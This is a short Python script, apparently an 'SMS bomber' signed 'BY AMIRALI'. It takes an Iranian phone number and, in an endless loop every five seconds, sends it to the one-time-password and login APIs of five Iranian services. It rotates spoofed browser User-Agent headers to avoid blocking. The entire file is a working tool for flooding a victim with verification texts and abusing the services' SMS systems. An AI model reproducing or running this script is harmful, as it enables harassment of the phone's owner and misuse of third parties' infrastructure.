#ساخت امیرعلی

#1#1#1#1#1##1
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
print("BY AMIRALI")
import requests
import time
import random
getnumber = input("Enter the number: +98 ")
url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
json = {"phoneNumber":""+getnumber}
url_i = "https://api.esam.ir/api/account/v2/RegisterOrLogin"
json_i = {"mobile":""+getnumber,"present_type":"WebApp","registration_method":0,"serialNumber":""}
url2 = "https://api.achareh.co/v2/accounts/login/?web=true"
json2 = {"phone":"98"+getnumber}
url3 = "https://uiapi2.saapa.ir/api/otp/sendCode"
json3 = {"mobile":"0"+getnumber,"from_meter_buy":False}
tapsi_url = "https://api.tapsi.cab/api/v2.2/user"
tapsi_json = {"credential":{"phoneNumber":"0"+getnumber,"role":"PASSENGER"},"otpOption":"SMS"}
heads = [
    {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/76.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/72.0",
    'Accept': '*/*'
    },
     {
    'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1; rv:76.0)Gecko/20100101 Firefox/69.0',
    'Accept': '*/*'
    },
     {
    "User-Agent" : "Mozilla/5.0 (X11; Debian; Linux X86_64; rv:72.0)Gecko/20100101 Firefox/76.0",
    'Accept': '*/*'
    },
]	
while True:
 random_head = random.choice(heads)
 req = requests.post(url=url_i,json=json_i,headers=random_head)
 req2 = requests.post(url=url,json=json,headers=random_head)
 req3 = requests.post(url=url2,json=json2,headers=random_head)
 req4 = requests.post(url=url3,json=json3,headers=random_head)
 req5 = requests.post(url=tapsi_url,json=tapsi_json,headers=random_head)
 print(req)
 print(req2)
 print(req3)
 print(req4)
 print(req5)
 time.sleep(5)



